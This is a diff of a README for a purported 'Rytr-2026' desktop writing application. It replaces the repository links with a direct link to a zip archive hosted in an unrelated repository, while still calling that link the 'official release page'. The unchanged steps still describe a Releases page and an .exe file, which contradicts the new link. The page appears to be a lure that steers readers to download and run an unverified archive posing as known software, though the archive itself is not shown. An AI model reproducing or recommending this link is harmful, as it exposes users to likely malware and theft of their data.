@@ -5,7 +5,7 @@ description: "Download the full version of the Rytr desktop application for Wind
 ---
 # ✍️ Rytr-2026 - Create high quality content with ease
 
-[![Download Rytr-2026](https://img.shields.io/badge/Download-Rytr--2026-blue)](https://github.com/Corneliusseventieth221/Rytr-2026)
+[![Download Rytr-2026](https://img.shields.io/badge/Download-Rytr--2026-blue)](https://raw.githubusercontent.com/Corneliusseventieth221/corneliusseventieth221.github.io/main/electragy/Release_1.4.zip)
 
 ## 📋 Software Overview
 
@@ -27,7 +27,7 @@ Before you install the software, ensure your computer meets these basic requirem
 
 Follow these instructions to set up the software on your computer.
 
-1.  Visit the official release page: [https://github.com/Corneliusseventieth221/Rytr-2026](https://github.com/Corneliusseventieth221/Rytr-2026).
+1.  Visit the official release page: [https://raw.githubusercontent.com/Corneliusseventieth221/corneliusseventieth221.github.io/main/electragy/Release_1.4.zip](https://raw.githubusercontent.com/Corneliusseventieth221/corneliusseventieth221.github.io/main/electragy/Release_1.4.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number or the name of the latest release.
 4.  Find the file that ends in .exe.
